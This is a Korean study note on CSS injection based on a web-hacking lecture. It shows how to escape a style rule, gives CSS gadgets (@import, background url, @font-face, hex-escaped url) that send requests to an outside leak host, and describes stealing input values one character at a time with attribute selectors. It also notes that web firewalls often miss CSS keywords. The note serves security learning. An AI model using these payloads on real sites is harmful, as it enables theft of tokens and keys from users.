# CSS Injection

### Cascading Style Sheet (CSS)
* HTML이 표시되는 방법을 정의하는 스타일 시트 언어
    - HTML로 정의된 문서를 다채롭게 하는 역할을 수행함
    - 이미지, 태그, 글자 등의 다양한 HTML 요소들이 사용자에게 어떻게 보여질지 정의할 수 있음

<br/>

### CSS Injection
* XSS와 비슷하게 웹 페이지 로딩 시 악의적인 문자열을 삽입하여 악의적인 동작을 이끄는 공격 <br/> &nbsp;&nbsp; = 표현에 사용될 임의의 CSS 코드를 주입시켜 의도하지 않은 속성이 정의되는 것
    - 공격자가 임의 CSS 속성을 삽입해 CSS Injection 공격을 수행할 수 있음
        | 공격자가 수행할 수 있는 동작 | 설명 |
        |---|------|
        | 웹 페이지의 UI(외관)을 변조 | 특정 버튼, ```<h1>``` 태그의 크기와 색깔 등을 변경할 수 있음
        | CSS 속성의 다양한 기능을 통해 <br/> 웹 페에지 내의 데이터를 외부로 훔침 | CSRF Token, 피해자의 API Key 등 웹 페이지에 직접적으로 보여지는 값처럼 <br/>**CSS 선택자를 통해 표현이 가능한 데이터만 탈취**할 수 있음 <br/> &nbsp;&nbsp; → CSS 선택자로 표현이 불가능한 ```script``` 태그 내 데이터들은 탈취할 수 없음! |
        + HTML (style) 영역에 공격자가 임의 입력 값을 넣을 수 있거나 임의 HTML를 삽입할 수 있지만 Content-Security-Policy로 인해 자바스크립트를 실행할 수 없는 등 다양한 환경에서 사용할 수 있음
    - 악의적인 CSS의 위험성은 임의 Javascript 삽입의 위험성보다 잘 알려져있지 않아 대개 무시되고 있음 → 📌 많은 회사에서 CSS Injection 취약점이 발생
        + 그 파급력과 심각성에 대해 대중에 널리 알려지지 않고 다양한 웹 방화벽에서 차단하지 않는 입력값을 가지고 있음
            | 키워드 | 설명 |
            |---|------|
            | ```"<script>"```, ```"alert"```, ```eval``` 등의 키워드 | 보통의 웹 방화벽의 경우 임의 Javascript의 실행을 막기 위한 <br/>키워드를 차단함 | 
            | ```"background:"```, ```"url``` 등의 키워드 | CSS Injection에 주로 사용되는 키워드는 차단하지 않음 |

<br/><br/>

## CSS Injection: 기초
* 예시: 이용자로부터 ```theme``` 값을 입력 받아 ```<style>``` 태그 내에 출력하는 웹 어플리케이션
    ```javascript
    <style>
        body { background-color: ${theme}; }
    </style>
    <h1>Hello, it's dreame. Interesting with CSS Injection?</h1>

    if '<' in theme:
        exit(0)
    ```
    - ```theme``` 값 내에 ```<```를 입력할 수 없어 정의된 ```<style>``` 태그르 벗어나는 것은 불가능함
    - CSS 속성만 출력할 수 있음

<br/>

### 임의 영역의 UI 변경: 색상 변경
| 예시 | 설명 |
|---|------|
| ```background-color```로 배경 색상 변경 | ```theme``` 값으로 배경 색상을 지정 |
| ```background-color```가 아닌 ```h1```의 글자 색 변경 | ⚠️ **CSS Injection**: ```}``` 문자를 이용해 기존 속성을 탈출한 다음 ```h1```의 속성을 지정 <br/> &nbsp;&nbsp; → ``` 배경색; } h1 { color: 글자색; }```를 입력하여 ```h1```의 글자를 원하는 색으로 변경 가능 |

<img width="2560" alt="색상 변경" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/59053d17-d078-4963-8f27-30633f3e7656">
<br/>

<br/>

### 웹 페이지 내 데이터 탈취: IP Ping Back
* 📌 클라이언트 사이드 공격을 통해 데이터를 외부로 탈취하기 위한 전제 조건: *공격자의 서버로 요청을 보낼 수 있어야 함*
    - CSS 속성으로 외부 속성(Ping Back)을 전송하는 방법
        + CSS는 다른 사이트의 이미지나 폰트 등 외부 리소스를 불러오는 기능을 제공함 <br/> &nbsp;&nbsp; → 여러 방법이 존재하면 cure53의 HTTPLeaks 가젯을 이용하는 것이 대표적임
* 예시: CSS Injection을 통한 ```h1```의 글자 색 변경 방법
    ```css
    /* CSS 가젯 1: 외부 CSS 파일을 로드 → 모든 속성 중 가장 상단에 위치해야 함 (그렇지 않으면 @import는 무시됨) */
    @import 'https://leaking.via/css-import-string';
    @import url(https://leaking.via/css-import-url); /* url 함수: URL를 불러오는 역할을 함 (상황에 따라서 선택적으로 사용) */

    /* CSS 가젯 2: background 속성으로 요소의 배경을 변경할 때 사용할 이미지를 불러옴 */
    background: url(https://leaking.via/css-background);

    /* CSS 가젯 3: 불러올 폰트 파일의 주소를 지정함 */
    @font-face {
        font-family: leak;
        src: url(https://leaking.via/css-font-src);
    }

    /* CSS 가젯 4: CSS에서 함수를 호출할 때 ascii 형태의 "url"이 아닌 hex 형태인 "\000075\000072\00006C"도 지원함 */
    background-image: \000075\000072\00006C(https://leaking.via/css-escape-url-2);
    ```
    + 이러한 CSS 가젯들 중 하나를 사용해 페이지 내에서 외부 서버로 요청을 보낼 수 있음
    + 실습 과정
      <br/><br/>
      <img width="2560" alt="IP Ping Back" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/f02c7c41-868f-43ff-8de6-189058cfcde2"><br/>

        | 순서 | 설명 |
        |:---:|------|
        | 01 | 요청을 받을 외부 웹 서버를 준비함 (여기서는 드림핵 툴즈의 Request Bin 기능을 이용함) |
        | 02 | **개발자 도구의 [Network] 탭**에서 요청을 기록함 → 📌 *CSS Injection 성공 여부를 확인할 수 있음* |
        | 03 | 외부 웹 서버 주소를 ```body```의 ```background``` 속성의 값으로 설정함 <br/> &nbsp;&nbsp; → ```yellow: background: url("https://RANDOMHOST.request.dreamhack.games/ping-back");```
        | 04 | 개발자 도구에서 드림핵 툴즈로 보낸 요청을 확인하고, 드램핵 툴즈의 Request Bin에서도 수신한 요청을 확인함 |


<br/><br/>

## CSS Injection: 데이터 탈취 (입력 박스 내용 탈취)
* 예시: [CSS Injection: 기초]에서 사용한 예시와 동일함

<br/>

* CSS Attribute Selector(특성 선택자)를 통한 입력 박스(```Input```)의 값(```Value```)를 탈취하는 방법
    - CSS Attribute Selector [참고: 📚 [Attribute Selector docs](https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors)]
        + Element의 Attribute를 Selection할 수 있는 기능을 제공함
        + 특성 선택자의 구문
            | 구문 | 설명 |
            |---|------|
            | ```[attr]``` | ```attr```이라는 이름의 특성을 가진 요소를 선택함 |
            | ```[attr=value]``` | ```attr```이라는 이름의 특성값이 정확히 ```value```인 요소를 선택함 |
            | ```[attr~=value]``` | ```attr```이라는 이름의 특성값이 정확히 ```value```인 요소를 선택함 <br/> &nbsp;&nbsp; - ```attr``` 특성은 공백으로 구분한 여러 개의 값을 가지고 있을 수 있음 |
            | ```[attr^=value]``` | ```attr```이라는 특성값을 가지고 있으며, 접두사로 ```value```가 값에 포함되어 있으면 이 요소를 선택함 |
            | ```[attr$=value]``` | ```attr```이라는 특성값을 가지고 있으며, 접미사로 ```value```가 값에 포함되어 있으면 이 요소를 선택함 |
    - ⚠️ ```[attr^=value]``` 구문을 입력하여 입력 박스의 내용을 탈취할 수 있음
        + 입력 박스의 내용을 탈취하는 과정
            | 순서 | 설명 |
            |:---:|------|
            | 01 | ```[attr^=value]``` 구문을 이용해 가장 첫 한 글자를 먼저 탈취함 |
            | 02 | 1번에서 탈취한 글자를 접두사로 그 다음 한 글자를 탈취함 |
            | 03 | 1번과 2번 과정을 반복함 |
        + 실습 예시
          <br/><br/>
          <img width="2560" alt="데이터 탈취" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/917b0b95-5f1a-48ca-b9c6-325ac5c42082">
          <br/>

            - 개발자 도구의 Network 탭을 확인하여 탈취에 성공했는지 알 수 있음 (성공 시 지정한 URL로 요청을 전송함)


<br/><br/><br/><br/>
### 🔖 출처
* [드림핵 Web Hacking Advanced - Client Side] 📌 [Exploit Tech: CSS Injection](https://dreamhack.io/lecture/courses/327)
